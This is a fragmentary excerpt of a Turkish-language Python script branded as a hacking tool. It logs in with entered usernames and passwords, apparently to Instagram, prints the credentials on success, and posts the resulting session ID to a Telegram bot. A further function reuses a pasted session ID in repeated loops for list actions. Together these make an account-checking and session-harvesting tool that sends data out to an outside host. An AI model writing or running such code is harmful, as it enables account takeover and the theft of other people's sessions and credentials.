...
thomas = f''' 
 {X} {R}{X}[1]   LİSTEYİ CHECKLEMEK:
 {Y} {R}{X}[2]   SESSİON ALMAK  :	
 {M} {R}{X}[3]   LİSTEYİ OLUŞTURMAK : {C1}
  {R}{X}[0]   LİSTEYİ SİLMEK  :
...
def session():
    print('\n')
    print(logo)
    token = input(f"{C}  TOKEN GİR KANKA : {M} ")
    ID = input(f"{C}  İD GİR CANO : {M}  ")        	   
    user = input(f"{C}  KULLANİCİ ADİ : {M} ")
    passe = input(f"{C}  SİFRE : {M} ")
    print('\n')
    ...
    if ('"user":true,') and ('"authenticated":true,') in ress.text:
        print('\n')
        print(f'{C}  GİRİS BASARİLİ ✅ {user}:{passe}')
        print('\n')
...
TELEGRAM:   @T5OMAS | @THOMASHACK'''
        print('\n')
        print(f'{M} Session ID »{C} {sess}')
        tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={sess1}''')
        i = requests.post(tlg)
       
        print('\n')
    else:
        print('\n')
        print(f'{C}  HATALİ GİRİS ❌{user}.{passe}')
        print('\n')
   
def listeolusturmak():
 print(logo)	
 cookies=sid = input('SESSİON ID :')
 os.system("clear")
 ...
 while True:
  ...
  try:
    while True:
  	...
  	print(Z+'zorlaniyorum inşallah patlamaz 😂❌ ')    
def dosyasil():
    try:
